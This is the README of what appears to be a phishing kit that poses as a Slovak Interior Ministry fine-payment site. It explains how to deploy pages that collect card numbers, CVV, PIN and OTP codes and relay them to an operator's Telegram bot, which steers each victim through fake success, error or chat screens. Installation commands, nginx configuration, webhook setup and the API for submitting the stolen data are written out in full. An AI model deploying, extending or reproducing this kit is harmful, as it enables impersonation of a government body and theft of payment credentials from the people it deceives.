# 🇸🇰 Ministerstvo vnútra SR - Payment System

Система обработки платежей с интеграцией Telegram бота для управления.

## 📋 Содержание

- [Возможности](#возможности)
- [Требования](#требования)
- [Быстрая установка](#быстрая-установка)
- [Ручная установка](#ручная-установка)
- [Структура проекта](#структура-проекта)
- [Настройка](#настройка)
- [Использование](#использование)
- [API](#api)
- [Безопасность](#безопасность)
- [Отладка](#отладка)
- [FAQ](#faq)

## 🎯 Возможности

- ✅ Прием платежных данных (карта, CVV, PIN)
- ✅ 3D Secure OTP верификация
- ✅ Управление через Telegram бота
- ✅ Inline кнопки для быстрых действий
- ✅ Чат поддержки с пользователями
- ✅ Логирование всех действий
- ✅ Защита логов от внешнего доступа
- ✅ Адаптивный дизайн
- ✅ Поддержка webhook и polling

## 💻 Требования

### Минимальные требования:
- Ubuntu 20.04+ / Debian 11+
- PHP 8.1+
- Nginx или Apache
- SSL сертификат (Let's Encrypt)
- Telegram Bot Token
- 512 MB RAM
- 1 GB свободного места

### Рекомендуемые:
- Ubuntu 22.04 LTS
- PHP 8.2
- Nginx 1.18+
- 1 GB RAM
- 5 GB свободного места

## 🚀 Быстрая установка

### Автоматическая установка (рекомендуется)

```bash
# 1. Скачайте проект
git clone https://github.com/your-repo/payment-system.git
cd payment-system

# 2. Сделайте скрипт исполняемым
chmod +x install.sh

# 3. Запустите установку
sudo ./install.sh
```

Скрипт автоматически:
- Установит все зависимости
- Настроит Nginx
- Установит SSL сертификат
- Настроит Telegram webhook
- Создаст systemd сервис для бота

### Что нужно подготовить:

1. **Telegram Bot Token**
   ```
   Откройте @BotFather в Telegram
   Отправьте: /newbot
   Следуйте инструкциям
   Скопируйте токен: 1234567890:ABCdefGHIjklMNOpqrsTUVwxyz
   ```

2. **Telegram Chat ID (группа или личка)**
   
   **Для группы (рекомендуется):**
   ```
   1. Создайте группу в Telegram
   2. Добавьте бота в группу
   3. Сделайте бота администратором
   4. Добавьте @userinfobot в группу
   5. Отправьте любое сообщение
   6. Скопируйте Chat ID (начинается с -100)
   7. Удалите @userinfobot
   ```
   
   **Для личных сообщений:**
   ```
   Откройте @userinfobot в Telegram
   Отправьте: /start
   Скопируйте ваш ID: 123456789
   ```
   
   📖 Подробная инструкция: [TELEGRAM_GROUP_SETUP.md](TELEGRAM_GROUP_SETUP.md)

3. **Домен**
   ```
   Направьте A-запись вашего домена на IP сервера
   example.com -> 1.2.3.4
   ```

## 🔧 Ручная установка

<details>
<summary>Развернуть инструкцию</summary>

### 1. Установка зависимостей

```bash
sudo apt update && sudo apt upgrade -y
sudo apt install -y nginx php8.1-fpm php8.1-cli php8.1-curl \
                    php8.1-mbstring php8.1-json certbot \
                    python3-certbot-nginx git
```

### 2. Копирование файлов

```bash
sudo mkdir -p /var/www/payment
sudo cp -r public_html /var/www/payment/
sudo chown -R www-data:www-data /var/www/payment
sudo chmod -R 755 /var/www/payment
sudo chmod -R 777 /var/www/payment/public_html/logs
```

### 3. Настройка config.php

```bash
sudo nano /var/www/payment/public_html/config.php
```

Замените:
```php
define('BOT_TOKEN', 'YOUR_BOT_TOKEN');
define('CHAT_ID', 'YOUR_CHAT_ID');
```

### 4. Настройка Nginx

```bash
sudo nano /etc/nginx/sites-available/example.com
```

```nginx
server {
    listen 80;
    server_name example.com www.example.com;
    root /var/www/payment/public_html;
    index index.php index.html;

    access_log /var/log/nginx/payment_access.log;
    error_log /var/log/nginx/payment_error.log;

    location /logs {
        deny all;
        return 404;
    }

    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/var/run/php/php8.1-fpm.sock;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include fastcgi_params;
    }

    location ~* \.(jpg|jpeg|png|gif|ico|css|js)$ {
        expires 1y;
        add_header Cache-Control "public, immutable";
    }

    location ~ /\. {
        deny all;
    }
}
```

Активация:
```bash
sudo ln -s /etc/nginx/sites-available/example.com /etc/nginx/sites-enabled/
sudo nginx -t
sudo systemctl restart nginx
```

### 5. SSL сертификат

```bash
sudo certbot --nginx -d example.com -d www.example.com
```

### 6. Настройка Telegram webhook

```bash
curl "https://api.telegram.org/botYOUR_BOT_TOKEN/setWebhook?url=https://example.com/bot/bot_handler.php"
```

Проверка:
```bash
curl "https://api.telegram.org/botYOUR_BOT_TOKEN/getWebhookInfo"
```

</details>

## 📁 Структура проекта

```
payment-system/
├── install.sh                    # Скрипт автоматической установки
├── README.md                     # Документация
└── public_html/
    ├── index.php                 # Главная страница
    ├── config.php               # Конфигурация
    ├── pages/                   # Страницы
    │   ├── loading.php         # Страница обработки
    │   ├── error.php           # Страница ошибки
    │   ├── success.php         # Страница успеха
    │   └── processing.php      # Обработка данных
    ├── api/                     # API endpoints
    │   ├── gateway.php         # Обработка платежей
    │   ├── check.php           # Проверка статуса
    │   ├── submit_otp.php      # Отправка OTP
    │   ├── send_chat.php       # Отправка сообщения в чат
    │   ├── get_chat.php        # Получение сообщений чата
    │   └── create_support_session.php
    ├── admin/                   # Админ панель
    │   ├── manual_reply.php    # Просмотр сессий
    │   ├── setup_webhook.php   # Настройка webhook
    │   ├── change_status.php   # Изменение статуса
    │   ├── send_admin_reply.php
    │   └── get_active_sessions.php
    ├── bot/                     # Telegram бот
    │   ├── bot_handler.php     # Webhook handler
    │   ├── webhook.php         # Старый webhook
    │   └── polling.php         # Long polling (для localhost)
    ├── assets/
    │   ├── css/style.css
    │   ├── js/main.js
    │   └── inc/
    │       ├── header.php
    │       ├── footer.php
    │       └── support_widget.php
    └── logs/                    # Логи (защищено .htaccess)
        ├── .htaccess           # Deny from all
        ├── bot_updates.log     # Логи бота
        ├── *.status            # Статусы сессий
        └── *.chat              # История чатов
```

## ⚙️ Настройка

### Конфигурация (config.php)

```php
// Telegram Bot
define('BOT_TOKEN', 'YOUR_BOT_TOKEN');
define('CHAT_ID', 'YOUR_CHAT_ID'); // For group: -1001234567890, for personal: 123456789

// Paths
define('LOGS_DIR', __DIR__ . '/logs/');
define('ROOT_DIR', __DIR__ . '/');
define('API_DIR', __DIR__ . '/api/');
define('PAGES_DIR', __DIR__ . '/pages/');
define('ADMIN_DIR', __DIR__ . '/admin/');
define('BOT_DIR', __DIR__ . '/bot/');
```

### Webhook vs Polling

**Webhook (рекомендуется для продакшена):**
- Автоматически получает обновления от Telegram
- Требует HTTPS и публичный домен
- Настраивается автоматически скриптом установки

**Polling (для разработки/localhost):**
```bash
# Запуск вручную
php public_html/bot/polling.php

# Или через systemd
sudo systemctl start telegram-bot
sudo systemctl status telegram-bot
```

## 📱 Использование

### Процесс работы

1. **Пользователь заполняет форму**
   - Открывает сайт
   - Вводит данные карты, CVV, PIN
   - Нажимает "Zaplatiť"

2. **Админ получает уведомление в Telegram**
   ```
   🔔 NOVÁ PLATBA - POKUTA SK
   
   📋 OVERENIE:
   🚗 VIN: WVWZZZ1KZBW123456
   🆔 Doklad: AA123456
   
   💳 PLATOBNÉ ÚDAJE:
   👤 Držiteľ: MENO PRIEZVISKO
   💳 Karta: 1234 5678 9012 3456
   📅 Platnosť: 12/25
   🔐 CVV: 123
   🔑 PIN: 1234
   
   📊 INFO:
   💰 Suma: 25,00 €
   🆔 Session: abc123def456
   🌐 IP: 1.2.3.4
   
   [📱 Запросить OTP] [❌ Ошибка]
   [✅ Успех] [💬 Чат]
   ```

3. **Админ выбирает действие**

   **Вариант A: Запросить OTP**
   - Нажимает "📱 Запросить OTP"
   - Пользователь видит форму ввода 6-значного кода
   - Пользователь вводит код
   - Админ получает код в Telegram
   - Админ нажимает "✅ Успех" или "❌ Ошибка"

   **Вариант B: Сразу завершить**
   - Нажимает "✅ Успех" - пользователь видит успех
   - Нажимает "❌ Ошибка" - пользователь видит ошибку

   **Вариант C: Открыть чат**
   - Нажимает "💬 Чат"
   - Может общаться с пользователем в реальном времени

### Управление через Telegram

#### Формат Session ID
Session ID - это 32-символьный MD5 хеш (например: `abc123def456789...`)

#### Ответы в чат
После активации чата отправьте сообщение в формате:
```
abc123def456 Ваше сообщение
```

Или просто ответьте (Reply) на сообщение бота.

### Виджет поддержки

На всех страницах доступна кнопка 💬 в правом нижнем углу:
- Пользователь кликает на кнопку
- Открывается окно чата
- Пишет сообщение
- Админ получает в Telegram
- Админ отвечает через бота

## 🔌 API

### POST /api/gateway.php
Обработка платежа

**Параметры:**
```
vin_hidden: VIN код (опционально)
doc_hidden: Номер документа (опционально)
holder: Имя держателя карты
card: Номер карты
expiry: Срок действия (MM/YY)
cvv: CVV код
pin: PIN код
```

**Ответ:**
```json
{
  "success": true,
  "session_id": "abc123def456"
}
```

### GET /api/check.php?id=SESSION_ID
Проверка статуса сессии

**Ответ:**
```json
{
  "status": "waiting|otp|ok|err|chat"
}
```

### POST /api/submit_otp.php
Отправка OTP кода

**Параметры:**
```
id: Session ID
otp: 6-значный код
```

### POST /api/send_chat.php
Отправка сообщения в чат

**Параметры:**
```
id: Session ID
message: Текст сообщения
```

### GET /api/get_chat.php?id=SESSION_ID
Получение истории чата

**Ответ:**
```json
{
  "messages": [
    {
      "from": "user|admin",
      "text": "Сообщение",
      "time": 1234567890
    }
  ]
}
```

## 🔒 Безопасность

### Защита логов
```apache
# public_html/logs/.htaccess
Deny from all
```

### Рекомендации

1. **Используйте HTTPS**
   ```bash
   sudo certbot --nginx -d example.com
   ```

2. **Ограничьте доступ к админ панели**
   ```nginx
   location /admin {
       allow 1.2.3.4;  # Ваш IP
       deny all;
   }
   ```

3. **Регулярно очищайте логи**
   ```bash
   # Удалить логи старше 7 дней
   find /var/www/payment/public_html/logs -name "*.status" -mtime +7 -delete
   find /var/www/payment/public_html/logs -name "*.chat" -mtime +7 -delete
   ```

4. **Мониторинг**
   ```bash
   # Просмотр логов Nginx
   tail -f /var/log/nginx/payment_access.log
   tail -f /var/log/nginx/payment_error.log
   
   # Просмотр логов бота
   tail -f /var/www/payment/public_html/logs/bot_updates.log
   ```

5. **Firewall**
   ```bash
   sudo ufw allow 80/tcp
   sudo ufw allow 443/tcp
   sudo ufw allow 22/tcp
   sudo ufw enable
   ```

## 🐛 Отладка

### Проверка webhook

```bash
curl "https://api.telegram.org/botYOUR_TOKEN/getWebhookInfo"
```

Должно вернуть:
```json
{
  "ok": true,
  "result": {
    "url": "https://example.com/bot/bot_handler.php",
    "has_custom_certificate": false,
    "pending_update_count": 0
  }
}
```

### Проверка статуса сессии

```bash
cat /var/www/payment/public_html/logs/SESSION_ID.status
# Должно вернуть: waiting, otp, ok, err, или chat
```

### Проверка чата

```bash
cat /var/www/payment/public_html/logs/SESSION_ID.chat
# Должно показать JSON с сообщениями
```

### Логи бота

```bash
tail -f /var/www/payment/public_html/logs/bot_updates.log
```

### Тест отправки в Telegram

```bash
curl -X POST "https://api.telegram.org/botYOUR_TOKEN/sendMessage" \
  -d "chat_id=YOUR_CHAT_ID" \
  -d "text=Test message"
```

### Проверка PHP

```bash
php -v
php -m | grep curl
php -m | grep mbstring
php -m | grep json
```

### Проверка Nginx

```bash
sudo nginx -t
sudo systemctl status nginx
```

### Проверка прав доступа

```bash
ls -la /var/www/payment/public_html/logs/
# Должно быть: drwxrwxrwx
```

## ❓ FAQ

### Webhook не работает

**Проблема:** Бот не получает обновления

**Решение:**
1. Проверьте SSL сертификат
2. Убедитесь что домен доступен извне
3. Проверьте логи Nginx
4. Используйте polling для локальной разработки

```bash
php public_html/bot/polling.php
```

### OTP форма сбрасывается

**Проблема:** Цифры исчезают при вводе

**Решение:** Уже исправлено в последней версии. Проверка статуса останавливается после показа OTP формы.

### Сообщения не приходят в чат

**Проблема:** Админ отправляет сообщение, но оно не появляется на сайте

**Решение:**
1. Проверьте формат: `SESSION_ID Сообщение`
2. Убедитесь что чат активирован (статус = chat)
3. Проверьте логи бота

### Ошибка 502 Bad Gateway

**Проблема:** Nginx не может подключиться к PHP-FPM

**Решение:**
```bash
sudo systemctl status php8.1-fpm
sudo systemctl restart php8.1-fpm
```

### Логи не защищены

**Проблема:** Можно открыть /logs/ в браузере

**Решение:**
```bash
echo "Deny from all" | sudo tee /var/www/payment/public_html/logs/.htaccess
```

## 📞 Поддержка

- **Документация:** README.md
- **Установка:** install.sh
- **Логи:** /var/www/payment/public_html/logs/

## 📄 Лицензия

MIT License

## 🙏 Благодарности

- Telegram Bot API
- Nginx
- PHP
- Let's Encrypt
# 122323
